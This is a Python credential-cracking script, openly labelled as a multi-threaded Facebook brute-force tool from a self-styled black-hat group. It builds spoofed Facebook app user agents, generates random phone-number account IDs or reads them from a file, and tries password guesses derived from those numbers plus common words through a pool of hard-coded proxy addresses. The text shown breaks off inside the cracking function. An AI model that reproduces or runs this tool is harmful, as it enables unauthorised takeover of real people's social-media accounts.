# ARAFAT CYBER 1995
# BANGLADESH BLACK HAT HACKER GROUP-1995

#_________[ IMPORTING MODULES ]______>>
import os,requests,json,time
import re,random,sys,uuid,string,subprocess
from concurrent.futures import ThreadPoolExecutor as ThreadPool
#__________[ EMPTY LOOP / LIST ]_______>>
oks = []
user_ID = []
cps = []
cracked = []
pwx = []
ualist = []
def ua_api():
    vers = random.randrange(6,13)
    verq = random.choice(["RMX3472", "RMX3611", "RMX3396", "RMX3572", "RMX3706", "RMX3396", "RMX3610", "RMX3371", "RMX3572", "RMX3461", "RMX3311", "RMX3563", "RMX3371", "RMX3269", "RMX3370", "RMX3574", "RMX3661", "RMX3611"])
    xnxx = random.choice(['Samsung', 'Galaxy A7(2016)', 'a7xltechn', 'SM-A710XZ', 'Absolute', 'GT-B9120', 'GT-B9120', 'Acclaim', 'SCH-R880', 'SCH-R880', 'Admire', 'SCH-R720', 'SCH-R720', 'Amazing', 'amazingtrf', 'SGH-S730M', 'Baffin', 'baffinltelgt', 'SHV-E270L', 'Captivate Glide', 'SGH-I927 Samsung-SGH-I927', 'Captivate Glide', 'SGH-I927', 'SGH-I927', 'China Telecom', 'kylevectc', 'SCH-I699I', 'Chromebook Plus', 'kevin_cheets', 'kevin', 'Chromebook Plus', 'kevin_cheets Samsung Chromebook Plus', 'Chromebook Pro', 'caroline_cheets', 'caroline', 'Chromebook Pro', 'caroline_cheets Samsung Chromebook Pro', 'Conquer', 'SPH-D600', 'SPH-D600', 'DoubleTime', 'SGH-I857 Samsung-SGH-I857', 'Droid Charge', 'SCH-I510', 'SCH-I510', 'Elite', 'eliteltechn', 'SM-G1600', 'Elite', 'elitexltechn', 'SM-G1650', 'Europa', 'GT-I5500B', 'GT-I5500B', 'Europa', 'GT-I5500L', 'GT-I5500L', 'Europa', 'GT-I5500M', 'GT-I5500M', 'Europa', 'GT-I5503T', 'GT-I5503T', 'Europa', 'GT-I5510L', 'GT-I5510L', 'Exhibit', 'SGH-T759', 'SGH-T759', 'Galaxy (China)', 'GT-B9062', 'GT-B9062', 'Galaxy 070', 'hendrix', 'YP-GI2', 'Galaxy A', 'archer', 'archer', 'Galaxy A', 'archer', 'SHW-M100S', 'Galaxy A3 (2017)', 'a3y17lte', 'SM-A320Y', 'Galaxy A3', 'a33g', 'SM-A300H', 'Galaxy A3', 'a3lte', 'SM-A300F', 'Galaxy A3', 'a3lte', 'SM-A300M', 'Galaxy A3', 'a3lte', 'SM-A300XZ', 'Galaxy A3', 'a3lte', 'SM-A300YZ', 'Galaxy A3', 'a3ltechn', 'SM-A3000', 'Galaxy A3', 'a3ltechn', 'SM-A300X', 'Galaxy A3', 'a3ltectc', 'SM-A3009', 'Galaxy A3', 'a3ltedd', 'SM-A300G', 'Galaxy A3', 'a3lteslk', 'SM-A300F', 'Galaxy A3', 'a3ltezh', 'SM-A3000', 'Galaxy A3', 'a3ltezt', 'SM-A300YZ', 'Galaxy A3', 'a3ulte', 'SM-A300FU', 'Galaxy A3', 'a3ulte', 'SM-A300XU', 'Galaxy A3', 'a3ulte', 'SM-A300Y', 'Galaxy A3(2016)', 'a3xelte', 'SM-A310F', 'Galaxy A3(2016)', 'a3xelte', 'SM-A310M', 'Galaxy A3(2016)', 'a3xelte', 'SM-A310X', 'Galaxy A3(2016)', 'a3xelte', 'SM-A310Y', 'Galaxy A3(2016)', 'a3xeltekx', 'SM-A310N0', 'Galaxy A3(2017)', 'a3y17lte', 'SM-A320F', 'Galaxy A3(2017)', 'a3y17lte', 'SM-A320FL', 'Galaxy A3(2017)', 'a3y17lte', 'SM-A320X', 'Galaxy A5', 'a53g', 'SM-A500H', 'Galaxy A5', 'a5lte', 'SM-A500F', 'Galaxy A5', 'a5lte', 'SM-A500G', 'Galaxy A5', 'a5lte', 'SM-A500M', 'Galaxy A5', 'a5lte', 'SM-A500XZ', 'Galaxy A5', 'a5ltechn', 'SM-A5000', 'Galaxy A5', 'a5ltechn', 'SM-A500X', 'Galaxy A5', 'a5ltectc', 'SM-A5009', 'Galaxy A5', 'a5ltezh', 'SM-A5000', 'Galaxy A5', 'a5ltezt', 'SM-A500YZ', 'Galaxy A5', 'a5ulte', 'SM-A500FU', 'Galaxy A5', 'a5ulte', 'SM-A500Y', 'Galaxy A5', 'a5ultebmc', 'SM-A500W', 'Galaxy A5', 'a5ultektt', 'SM-A500K', 'Galaxy A5', 'a5ultelgt', 'SM-A500L', 'Galaxy A5', 'a5ulteskt', 'SM-A500F1', 'Galaxy A5', 'a5ulteskt', 'SM-A500S', 'Galaxy A5(2016)', 'a5xelte', 'SM-A510F', 'Galaxy A5(2016)', 'a5xelte', 'SM-A510M', 'Galaxy A5(2016)', 'a5xelte', 'SM-A510X', 'Galaxy A5(2016)', 'a5xelte', 'SM-A510Y', 'Galaxy A5(2016)', 'a5xeltecmcc', 'SM-A5108', 'Galaxy A5(2016)', 'a5xeltektt', 'SM-A510K', 'Galaxy A5(2016)', 'a5xeltelgt', 'SM-A510L', 'Galaxy A5(2016)', 'a5xelteskt', 'SM-A510S', 'Galaxy A5(2016)', 'a5xeltextc', 'SM-A510Y', 'Galaxy A5(2016)', 'a5xltechn', 'SM-A5100', 'Galaxy A5(2016)', 'a5xltechn', 'SM-A5100X', 'Galaxy A5(2016)', 'a5xltechn', 'SM-A510XZ', 'Galaxy A5(2017)', 'a5y17lte', 'SM-A520F', 'Galaxy A5(2017)', 'a5y17lte', 'SM-A520X', 'Galaxy A5(2017)', 'a5y17ltecan', 'SM-A520W', 'Galaxy A5(2017)', 'a5y17ltektt', 'SM-A520K', 'Galaxy A5(2017)', 'a5y17ltelgt', 'SM-A520L', 'Galaxy A5(2017)', 'a5y17lteskt', 'SM-A520S', 'Galaxy A5x(2016)', 'a5xeltextc', 'SM-A510Y', 'Galaxy A7', 'a73g', 'SM-A700H', 'Galaxy A7', 'a7alte', 'SM-A700F', 'Galaxy A7', 'a7lte', 'SM-A700FD', 'Galaxy A7', 'a7lte', 'SM-A700X', 'Galaxy A7', 'a7ltechn', 'SM-A7000', 'Galaxy A7', 'a7ltechn', 'SM-A700YD', 'Galaxy A7', 'a7ltectc', 'SM-A7009', 'Galaxy A7', 'a7ltektt', 'SM-A700K', 'Galaxy A7', 'a7ltelgt', 'SM-A700L', 'Galaxy A7', 'a7lteskt', 'SM-A700S', 'Galaxy A7(2016)', 'a7xelte', 'SM-A710F', 'Galaxy A7(2016)', 'a7xelte', 'SM-A710M', 'Galaxy A7(2016)', 'a7xelte', 'SM-A710X', 'Galaxy A7(2016)', 'a7xeltecmcc', 'SM-A7108', 'Galaxy A7(2016)', 'a7xeltektt', 'SM-A710K', 'Galaxy A7(2016)', 'a7xeltelgt', 'SM-A710L', 'Galaxy A7(2016)', 'a7xelteskt', 'SM-A710S', 'Galaxy A7(2016)', 'a7xeltextc', 'SM-A710Y', 'Galaxy A7(2016)', 'a7xltechn', 'SM-A7100', 'Galaxy A7(2017)', 'a7y17lte', 'SM-A720F', 'Galaxy A7(2017)', 'a7y17lteskt', 'SM-A720S', 'Galaxy A8', 'a8elte', 'SM-A800F', 'Galaxy A8', 'a8elte', 'SM-A800YZ', 'Galaxy A8', 'a8elteskt', 'SM-A800S', 'Galaxy A8', 'a8hplte', 'SM-A800I', 'Galaxy A8', 'a8hplte', 'SM-A800IZ', 'Galaxy A8', 'a8ltechn', 'SM-A8000', 'Galaxy A8', 'a8ltechn', 'SM-A800X', 'Galaxy A8', 'SCV32', 'SCV32', 'Galaxy A8(2016)', 'a8xelte', 'SM-A810F', 'Galaxy A8(2016)', 'a8xelte', 'SM-A810YZ', 'Galaxy A8(2016)', 'a8xelteskt', 'SM-A810S', 'Galaxy A9 Pro', 'a9xproltechn', 'SM-A9100', 'Galaxy A9 Pro', 'a9xproltesea', 'SM-A910F', 'Galaxy A9(2016)', 'a9xltechn', 'SM-A9000', 'Galaxy Ace 4 Lite', 'vivalto3g', 'SM-G313U'])
    return (f"Dalvik/2.1.0 (Linux; U; Android {vers}; {verq} Build/{xnxx}) [FBAN/EMA;FBBV/470353487;FBAV/353.0.0.5.112;FBDV/{verq};FBLC/id_ID;FBNG/WIFI;FBMNT/METERED;FBDM/"+"{density=3.0}]")
#_______[ BASIC COLORS ]_____>>
white = '\033[1;37m'
rad = '\033[1;31m'
green = '\033[1;32m'
#_________[ LOGO ]______>>>
def logo():
    os.system("clear")
    print(f"{white}\n"
          f"\n"
          f"     \n"
          f"███╗░░░███╗██████╗░░░░░█████╗░██╗░░░░░░█████╗░███╗░░██╗███████╗░█████╗░███████╗\n"
          f"████╗░████║██╔══██╗░░░██╔══██╗██║░░░░░██╔══██╗████╗░██║██╔════╝██╔══██╗██╔════╝\n"
          f"██╔████╔██║██████╔╝░░░███████║██║░░░░░██║░░██║██╔██╗██║█████╗░░╚██████║██████╗░\n"
          f"██║╚██╔╝██║██╔══██╗░░░██╔══██║██║░░░░░██║░░██║██║╚████║██╔══╝░░░╚═══██║╚════██╗\n"
          f"██║░╚═╝░██║██║░░██║██╗██║░░██║███████╗╚█████╔╝██║░╚███║███████╗░█████╔╝██████╔╝\n"
          f"╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝╚═╝░░╚═╝╚══════╝░╚════╝░╚═╝░░╚══╝╚══════╝░╚════╝░╚═════╝░ {green}(Arafat){white}  ")
    print(50*'-')
    print(f" {white}{green}[~]{white} Owner     : MD EASIN ARAFAT ")
    print(f" {white}{green}[~]{white} Facebook  : MD EASIN ARAFAT ")
    print(f" {white}{green}[~]{white} Fucked By : LOVE ")
    print(f" {white}{green}[~]{white} Tool      : Multi Brute Force Facebook ")
    print(f" {white}{green}[~]{white} Github    : https://github.com/Alone95b ")
    print(f" {white}{green}[~]{white} Whatsapp  : 01743242420 Only Paid Promotion ")
    print(f" {white}{green}[~]{white} Status    : {green}Free ")
    print(f" {white}{green}[~]{white} Version   : 2.0 ")
    print(50*'-')
#_________[ USER-AGENT LIST GENERATER ]______>>>
for i in range(2000):
    fbs = random.choice([
        'com.facebook.adsmanager',
        'com.facebook.lite',
        'com.facebook.orca',
        'com.facebook.katana',
        'com.facebook.mlite'])
    application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
    application_version_code = str(random.randint(000000000,999999999))
    android_version = str(random.randrange(5,15))
    dens = str(random.randrange(0,5))
    xzx = random.choice(
        {'Samsung', 'GT-1015', 'GT-1020', 'GT-1030', 'GT-1035', 'GT-1040', 'GT-1045', 'GT-1050', 'GT-1240', 'GT-1440',
         'GT-1450', 'GT-18190', 'GT-18262', 'GT-19060I', 'GT-19082', 'GT-19083', 'GT-19105', 'GT-19152', 'GT-19192',
         'GT-19300', 'GT-19505', 'GT-2000', 'GT-20000', 'GT-200s', 'GT-3000', 'GT-414XOP', 'GT-6918', 'GT-7010',
         'GT-7020', 'GT-7030', 'GT-7040', 'GT-7050', 'GT-7100', 'GT-7105', 'GT-7110', 'GT-7205', 'GT-7210', 'GT-7240R',
         'GT-7245', 'GT-7303', 'GT-7310', 'GT-7320', 'GT-7325', 'GT-7326', 'GT-7340', 'GT-7405', 'GT-7550   5GT-8005',
         'GT-8010', 'GT-81', 'GT-810', 'GT-8105', 'GT-8110', 'GT-8220S', 'GT-8410', 'GT-9300', 'GT-9320', 'GT-93G',
         'GT-A7100', 'GT-A9500', 'GT-ANDROID', 'GT-B2710', 'GT-B5330', 'GT-B5330B', 'GT-B5330L', 'GT-B5330ZKAINU',
         'GT-B5510', 'GT-B5512', 'GT-B5722', 'GT-B7510', 'GT-B7722', 'GT-B7810', 'GT-B9150', 'GT-B9388', 'GT-C3010',
         'GT-C3262', 'GT-C3310R', 'GT-C3312', 'GT-C3312R', 'GT-C3313T', 'GT-C3322', 'GT-C3322i', 'GT-C3520',
         'GT-C3520I', 'GT-C3592', 'GT-C3595', 'GT-C3782', 'GT-C6712', 'GT-E1282T', 'GT-E1500', 'GT-E2200', 'GT-E2202',
         'GT-E2250', 'GT-E2252', 'GT-E2600', 'GT-E2652W', 'GT-E3210', 'GT-E3309', 'GT-E3309I', 'GT-E3309T', 'GT-G530H',
         'GT-g900f', 'GT-G930F', 'GT-H9500', 'GT-I5508', 'GT-I5801', 'GT-I6410', 'GT-I8150', 'GT-I8160OKLTPA',
         'GT-I8160ZWLTTT', 'GT-I8258', 'GT-I8262D', 'GT-I8268', 'GT-I8505', 'GT-I8530BAABTU', 'GT-I8530BALCHO',
         'GT-I8530BALTTT', 'GT-I8550E', 'GT-i8700', 'GT-I8750', 'GT-I900', 'GT-I9008L', 'GT-i9040', 'GT-I9080E',
         'GT-I9082C', 'GT-I9082EWAINU', 'GT-I9082i', 'GT-I9100G', 'GT-I9100LKLCHT', 'GT-I9100M', 'GT-I9100P',
         'GT-I9100T', 'GT-I9105UANDBT', 'GT-I9128E', 'GT-I9128I', 'GT-I9128V', 'GT-I9158P', 'GT-I9158V', 'GT-I9168I',
         'GT-I9192I', 'GT-I9195H', 'GT-I9195L', 'GT-I9250', 'GT-I9303I', 'GT-I9305N', 'GT-I9308I', 'GT-I9505G',
         'GT-I9505X', 'GT-I9507V', 'GT-I9600', 'GT-m190', 'GT-M5650', 'GT-mini', 'GT-N5000S', 'GT-N5100', 'GT-N5105',
         'GT-N5110', 'GT-N5120', 'GT-N7000B', 'GT-N7005', 'GT-N7100T', 'GT-N7102', 'GT-N7105', 'GT-N7105T', 'GT-N7108',
         'GT-N7108D', 'GT-N8000', 'GT-N8005', 'GT-N8010', 'GT-N8020', 'GT-N9000', 'GT-N9505', 'GT-P1000CWAXSA',
         'GT-P1000M', 'GT-P1000T', 'GT-P1010', 'GT-P3100B', 'GT-P3105', 'GT-P3108', 'GT-P3110', 'GT-P5100', 'GT-P5200',
         'GT-P5210XD1', 'GT-P5220', 'GT-P6200', 'GT-P6200L', 'GT-P6201', 'GT-P6210', 'GT-P6211', 'GT-P6800', 'GT-P7100',
         'GT-P7300', 'GT-P7300B', 'GT-P7310', 'GT-P7320', 'GT-P7500D', 'GT-P7500M', 'GT-P7500R', 'GT-P7500V',
         'GT-P7501', 'GT-P7511', 'GT-S3330', 'GT-S3332', 'GT-S3333', 'GT-S3370', 'GT-S3518', 'GT-S3570', 'GT-S3600i',
         'GT-S3650', 'GT-S3653W', 'GT-S3770K', 'GT-S3770M', 'GT-S3800W', 'GT-S3802', 'GT-S3850', 'GT-S5220',
         'GT-S5220R', 'GT-S5222', 'GT-S5230', 'GT-S5230W', 'GT-S5233T', 'GT-s5233w', 'GT-S5250', 'GT-S5253', 'GT-s5260',
         'GT-S5280', 'GT-S5282', 'GT-S5283B', 'GT-S5292', 'GT-S5300', 'GT-S5300L', 'GT-S5301', 'GT-S5301B', 'GT-S5301L',
         'GT-S5302', 'GT-S5302B', 'GT-S5303', 'GT-S5303B', 'GT-S5310', 'GT-S5310B', 'GT-S5310C', 'GT-S5310E',
         'GT-S5310G', 'GT-S5310I', 'GT-S5310L', 'GT-S5310M', 'GT-S5310N', 'GT-S5312', 'GT-S5312B', 'GT-S5312C',
         'GT-S5312L', 'GT-S5330', 'GT-S5360', 'GT-S5360B', 'GT-S5360L', 'GT-S5360T', 'GT-S5363', 'GT-S5367', 'GT-S5369',
         'GT-S5380', 'GT-S5380D', 'GT-S5500', 'GT-S5560', 'GT-S5560i', 'GT-S5570B', 'GT-S5570I', 'GT-S5570L',
         'GT-S5578', 'GT-S5600', 'GT-S5603', 'GT-S5610', 'GT-S5610K', 'GT-S5611', 'GT-S5620', 'GT-S5670', 'GT-S5670B',
         'GT-S5670HKBZTA', 'GT-S5690', 'GT-S5690R', 'GT-S5830', 'GT-S5830D', 'GT-S5830G', 'GT-S5830i', 'GT-S5830L',
         'GT-S5830M', 'GT-S5830T', 'GT-S5830V', 'GT-S5831i', 'GT-S5838', 'GT-S5839i', 'GT-S6010', 'GT-S6010BBABTU',
         'GT-S6012', 'GT-S6012B', 'GT-S6102', 'GT-S6102B', 'GT-S6293T', 'GT-S6310B', 'GT-S6310ZWAMID', 'GT-S6312',
         'GT-S6313T', 'GT-S6352', 'GT-S6500', 'GT-S6500D', 'GT-S6500L', 'GT-S6790', 'GT-S6790L', 'GT-S6790N',
         'GT-S6792L', 'GT-S6800', 'GT-S6800HKAXFA', 'GT-S6802', 'GT-S6810', 'GT-S6810B', 'GT-S6810E', 'GT-S6810L',
         'GT-S6810M', 'GT-S6810MBASER', 'GT-S6810P', 'GT-S6812', 'GT-S6812B', 'GT-S6812C', 'GT-S6812i', 'GT-S6818',
         'GT-S6818V', 'GT-S7230E', 'GT-S7233E', 'GT-S7250D', 'GT-S7262', 'GT-S7270', 'GT-S7270L', 'GT-S7272',
         'GT-S7272C', 'GT-S7273T', 'GT-S7278', 'GT-S7278U', 'GT-S7390', 'GT-S7390G', 'GT-S7390L', 'GT-S7392',
         'GT-S7392L', 'GT-S7500', 'GT-S7500ABABTU', 'GT-S7500ABADBT', 'GT-S7500ABTTLP', 'GT-S7500CWADBT', 'GT-S7500L',
         'GT-S7500T', 'GT-S7560', 'GT-S7560M', 'GT-S7562', 'GT-S7562C', 'GT-S7562i', 'GT-S7562L', 'GT-S7566',
         'GT-S7568', 'GT-S7568I', 'GT-S7572', 'GT-S7580E', 'GT-S7583T', 'GT-S758X', 'GT-S7592', 'GT-S7710', 'GT-S7710L',
         'GT-S7898', 'GT-S7898I', 'GT-S8500', 'GT-S8530', 'GT-S8600', 'GT-STB919', 'GT-T140', 'GT-T150', 'GT-V8a',
         'GT-V8i', 'GT-VC818', 'GT-VM919S', 'GT-W131', 'GT-W153', 'GT-X831', 'GT-X853', 'GT-X870', 'GT-X890',
         'GT-Y8750', 'Galaxy A7(2016)', 'a7xltechn', 'SM-A710XZ', 'Absolute', 'GT-B9120', 'GT-B9120', 'Acclaim',
         'SCH-R880', 'SCH-R880', 'Admire', 'SCH-R720', 'SCH-R720', 'Amazing', 'amazingtrf', 'SGH-S730M', 'Baffin',
         'baffinltelgt', 'SHV-E270L', 'Captivate Glide', 'SGH-I927 Samsung-SGH-I927', 'Captivate Glide', 'SGH-I927',
         'SGH-I927', 'China Telecom', 'kylevectc', 'SCH-I699I', 'Chromebook Plus', 'kevin_cheets', 'kevin',
         'Chromebook Plus', 'kevin_cheets Samsung Chromebook Plus', 'Chromebook Pro', 'caroline_cheets', 'caroline',
         'Chromebook Pro', 'caroline_cheets Samsung Chromebook Pro', 'Conquer', 'SPH-D600', 'SPH-D600', 'DoubleTime',
         'SGH-I857 Samsung-SGH-I857', 'Droid Charge', 'SCH-I510', 'SCH-I510', 'Elite', 'eliteltechn', 'SM-G1600',
         'Elite', 'elitexltechn', 'SM-G1650', 'Europa', 'GT-I5500B', 'GT-I5500B', 'Europa', 'GT-I5500L', 'GT-I5500L',
         'Europa', 'GT-I5500M', 'GT-I5500M', 'Europa', 'GT-I5503T', 'GT-I5503T', 'Europa', 'GT-I5510L', 'GT-I5510L',
         'Exhibit', 'SGH-T759', 'SGH-T759', 'Galaxy (China)', 'GT-B9062', 'GT-B9062', 'Galaxy 070', 'hendrix', 'YP-GI2',
         'Galaxy A', 'archer', 'archer', 'Galaxy A', 'archer', 'SHW-M100S', 'Galaxy A3 (2017)', 'a3y17lte', 'SM-A320Y',
         'Galaxy A3', 'a33g', 'SM-A300H', 'Galaxy A3', 'a3lte', 'SM-A300F', 'Galaxy A3', 'a3lte', 'SM-A300M',
         'Galaxy A3', 'a3lte', 'SM-A300XZ', 'Galaxy A3', 'a3lte', 'SM-A300YZ', 'Galaxy A3', 'a3ltechn', 'SM-A3000',
         'Galaxy A3', 'a3ltechn', 'SM-A300X', 'Galaxy A3', 'a3ltectc', 'SM-A3009', 'Galaxy A3', 'a3ltedd', 'SM-A300G',
         'Galaxy A3', 'a3lteslk', 'SM-A300F', 'Galaxy A3', 'a3ltezh', 'SM-A3000', 'Galaxy A3', 'a3ltezt', 'SM-A300YZ',
         'Galaxy A3', 'a3ulte', 'SM-A300FU', 'Galaxy A3', 'a3ulte', 'SM-A300XU', 'Galaxy A3', 'a3ulte', 'SM-A300Y',
         'Galaxy A3(2016)', 'a3xelte', 'SM-A310F', 'Galaxy A3(2016)', 'a3xelte', 'SM-A310M', 'Galaxy A3(2016)',
         'a3xelte', 'SM-A310X', 'Galaxy A3(2016)', 'a3xelte', 'SM-A310Y', 'Galaxy A3(2016)', 'a3xeltekx', 'SM-A310N0',
         'Galaxy A3(2017)', 'a3y17lte', 'SM-A320F', 'Galaxy A3(2017)', 'a3y17lte', 'SM-A320FL', 'Galaxy A3(2017)',
         'a3y17lte', 'SM-A320X', 'Galaxy A5', 'a53g', 'SM-A500H', 'Galaxy A5', 'a5lte', 'SM-A500F', 'Galaxy A5',
         'a5lte', 'SM-A500G', 'Galaxy A5', 'a5lte', 'SM-A500M', 'Galaxy A5', 'a5lte', 'SM-A500XZ', 'Galaxy A5',
         'a5ltechn', 'SM-A5000', 'Galaxy A5', 'a5ltechn', 'SM-A500X', 'Galaxy A5', 'a5ltectc', 'SM-A5009', 'Galaxy A5',
         'a5ltezh', 'SM-A5000', 'Galaxy A5', 'a5ltezt', 'SM-A500YZ', 'Galaxy A5', 'a5ulte', 'SM-A500FU', 'Galaxy A5',
         'a5ulte', 'SM-A500Y', 'Galaxy A5', 'a5ultebmc', 'SM-A500W', 'Galaxy A5', 'a5ultektt', 'SM-A500K', 'Galaxy A5',
         'a5ultelgt', 'SM-A500L', 'Galaxy A5', 'a5ulteskt', 'SM-A500F1', 'Galaxy A5', 'a5ulteskt', 'SM-A500S',
         'Galaxy A5(2016)', 'a5xelte', 'SM-A510F', 'Galaxy A5(2016)', 'a5xelte', 'SM-A510M', 'Galaxy A5(2016)',
         'a5xelte', 'SM-A510X', 'Galaxy A5(2016)', 'a5xelte', 'SM-A510Y', 'Galaxy A5(2016)', 'a5xeltecmcc', 'SM-A5108',
         'Galaxy A5(2016)', 'a5xeltektt', 'SM-A510K', 'Galaxy A5(2016)', 'a5xeltelgt', 'SM-A510L', 'Galaxy A5(2016)',
         'a5xelteskt', 'SM-A510S', 'Galaxy A5(2016)', 'a5xeltextc', 'SM-A510Y', 'Galaxy A5(2016)', 'a5xltechn',
         'SM-A5100', 'Galaxy A5(2016)', 'a5xltechn', 'SM-A5100X', 'Galaxy A5(2016)', 'a5xltechn', 'SM-A510XZ',
         'Galaxy A5(2017)', 'a5y17lte', 'SM-A520F', 'Galaxy A5(2017)', 'a5y17lte', 'SM-A520X', 'Galaxy A5(2017)',
         'a5y17ltecan', 'SM-A520W', 'Galaxy A5(2017)', 'a5y17ltektt', 'SM-A520K', 'Galaxy A5(2017)', 'a5y17ltelgt',
         'SM-A520L', 'Galaxy A5(2017)', 'a5y17lteskt', 'SM-A520S', 'Galaxy A5x(2016)', 'a5xeltextc', 'SM-A510Y',
         'Galaxy A7', 'a73g', 'SM-A700H', 'Galaxy A7', 'a7alte', 'SM-A700F', 'Galaxy A7', 'a7lte', 'SM-A700FD',
         'Galaxy A7', 'a7lte', 'SM-A700X', 'Galaxy A7', 'a7ltechn', 'SM-A7000', 'Galaxy A7', 'a7ltechn', 'SM-A700YD',
         'Galaxy A7', 'a7ltectc', 'SM-A7009', 'Galaxy A7', 'a7ltektt', 'SM-A700K', 'Galaxy A7', 'a7ltelgt', 'SM-A700L',
         'Galaxy A7', 'a7lteskt', 'SM-A700S', 'Galaxy A7(2016)', 'a7xelte', 'SM-A710F', 'Galaxy A7(2016)', 'a7xelte',
         'SM-A710M', 'Galaxy A7(2016)', 'a7xelte', 'SM-A710X', 'Galaxy A7(2016)', 'a7xeltecmcc', 'SM-A7108',
         'Galaxy A7(2016)', 'a7xeltektt', 'SM-A710K', 'Galaxy A7(2016)', 'a7xeltelgt', 'SM-A710L', 'Galaxy A7(2016)',
         'a7xelteskt', 'SM-A710S', 'Galaxy A7(2016)', 'a7xeltextc', 'SM-A710Y', 'Galaxy A7(2016)', 'a7xltechn',
         'SM-A7100', 'Galaxy A7(2017)', 'a7y17lte', 'SM-A720F', 'Galaxy A7(2017)', 'a7y17lteskt', 'SM-A720S',
         'Galaxy A8', 'a8elte', 'SM-A800F', 'Galaxy A8', 'a8elte', 'SM-A800YZ', 'Galaxy A8', 'a8elteskt', 'SM-A800S',
         'Galaxy A8', 'a8hplte', 'SM-A800I', 'Galaxy A8', 'a8hplte', 'SM-A800IZ', 'Galaxy A8', 'a8ltechn', 'SM-A8000',
         'Galaxy A8', 'a8ltechn', 'SM-A800X', 'Galaxy A8', 'SCV32', 'SCV32', 'Galaxy A8(2016)', 'a8xelte', 'SM-A810F',
         'Galaxy A8(2016)', 'a8xelte', 'SM-A810YZ', 'Galaxy A8(2016)', 'a8xelteskt', 'SM-A810S', 'Galaxy A9 Pro',
         'a9xproltechn', 'SM-A9100', 'Galaxy A9 Pro', 'a9xproltesea', 'SM-A910F', 'Galaxy A9(2016)', 'a9xltechn',
         'SM-A9000', 'Galaxy Ace 4 Lite', 'vivalto3g', 'SM-G313U', 'Galaxy Ace 4', 'vivaltods5m', 'SM-G313HU',
         'Galaxy Ace 4', 'vivaltods5m', 'SM-G313HY', 'Galaxy Ace 4', 'vivaltods5m', 'SM-G313M', 'Galaxy Ace 4',
         'vivaltods5m', })
    try:
        ualist.append(f'Dalvik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; {str(xzx[3])} Build/{str(xzx[2])} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density='+dens+'.0,width=720,height=1280};'+f'FBLC/en_US;FBRV/{str(application_version_code)};FBMF/{str(xzx[0])};FBBD/{str(xzx[0])};FBPN/{str(fbs)};FBDV/{str(xzx[3])};FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]')
    except IndexError:
        pass
#______[MAIN MENU]__________>>
def infinty() -> object:
    logo()
    os.system('xdg-open https://wa.me/message/7JOEMH4O6LPG1')
    print(f'{rad} BANGLADESH BLACK HAT HACKER GROUP 1995{white} ')
    print(50*'-')
    print(f'{white}{green} [1]{white} Random Crack')
    print(f'{white}{green} [2]{white} File Crack')
    print(f'{white}{green} [0]{white} Close Project')
    print(50*"-")
    EvilX = input(f'{white} [{rad}?{white}] Select Code : {green}')
    if EvilX in ['1','01']:
        random_number()
    elif EvilX in ['2','02']:
        file_crack()
    elif EvilX in ['0','00']:
        exit()
    else:
        print(f'{white}[{green}℅{white}] select one option ')
#______[ RANDOM NUMBER CRACK ]______>>
def random_number():
    logo()
    code = input(f"[{green}+{white}] Input Number Code : ")
    try:
        limit = int(input(f"[{green}+{white}] Input Limit Crack : "))
    except ValueError:
        limit = 5000
    for i in range(limit):
        user_ID.append(str(random.randint(1111111, 9999999)))
    pwx = {'first7digit', 'last7digit', 'first6digit,''last6digit', 'fullnumber', 'khankhan', 'khan12345', 'khan123',
           'baloch123', 'khan1122', 'baloch', 'kingkhan', 'afghanistan', 'pakistan', '786786', 'full_number',
           'khankhan', 'khan1122', 'khan12345', 'khan1234', 'khan12', 'khan786', 'khan123', 'khan123456', 'khankhan123',
           '786786','username'}
    with ThreadPool(max_workers=30) as BilalHaiderID:
        total = str(len(user_ID))
        logo()
        print(f" {green}[*]{white} Total UID for Crack : {total}")
        print(f" {green}[*]{white} Total Password for Crack : {str(len(pwx))}")
        print(f" {green}[*]{white} Code for UID Dump : {str(code)}")
        print(50*'-')
        for user in user_ID:
            uid = code+user
            BilalHaiderID.submit(bapi,uid,pwx,total)
    print(50*"-")
    print(f"\n{white}[{green}•{white}] process Has been Completed")
    print(f"{white}[{green}•{white}] Total Ids : {len(oks)} ")
#___________[ FILE CLONING OLD / NEW ]__________>>
def file_crack():
    logo()
    fileX = input(f"[{green}+{white}] Input File Path : ")
    try:
        file_data = open(fileX,"r").read()
    except FileNotFoundError:
        exit(f"\n{rad} file not found ... ")
    except PermissionError:
        exit(f"\n{rad} allow the permission ... ")
    try:
        limit = int(input(f"\n[{green}+{white}] Input Password Limit : "))
        if limit > 9:
            limit = 3
    except ValueError:
        limit = 3
    logo()
    print(f" {green}[*]{white}  example : first last - firstlast")
    print(f" {green}[*]{white}  example : first123 - last1234")
    print(f" {green}[*]{white}  example : firstlast123 - 786786 - khankhan")
    print(50*'-')
    for i in range(limit):
        password = input(f"[{green}+{white}] Input Password {str(i+1)} : ")
        if len(password) >= 6:
            pwx.append(password)
    with ThreadPool(max_workers=30) as BilalHaiderID:
        total = str(len(file_data.splitlines()))
        logo()
        print(f" {green}[*]{white}  Total UID for Crack : {total}")
        print(f" {green}[*]{white}  Total Password for Crack : {str(len(pwx))}")
        print(f" {green}[*]{white}  File Path : {fileX}")
        print(50*'-')
        uidX = file_data.splitlines()
        for uid in uidX:
            BilalHaiderID.submit(bapif,uid,pwx,total)
    print(50*"-")
    print(f"\n{white}[{green}•{white}] The process Has been Completed")
    print(f"{white}[{green}•{white}] Total Ids : {len(oks)} ")
#___________[ B-API CRACK ]________>>
def bapi(uid,pwx,total):
    global oks,cps
    global ualist
    global cracked
    try:
        last7digit = uid[int(len(uid))-7:]
        last6digit = uid[int(len(uid))-6:]
        first6digit = uid[0:6]
        fullnumber = uid
        sys.stdout.write(f'\r\r[{green}MARI-XB{white}] {len(cracked)}\{total} - {green}{len(oks)}{white}\{rad}{len(cps)}{white} ');sys.stdout.flush()
        for pw in pwx:
            pw = pw.replace("last7digit",last7digit)
            pw = pw.replace("last6digit",last6digit)
            pw = pw.replace("first6digit",first6digit)
            pw = pw.replace("fullnumber",fullnumber)
            useragent = str(ua_api())
            proxy = {'139.171.162.10:5520', '45.228.45.147:35010', '27.42.168.46:61308', '184.178.172.18:15280',
                     '36.91.203.231:5678', '49.156.38.126:5678', '58.34.34.186:10800', '192.111.135.18:18301',
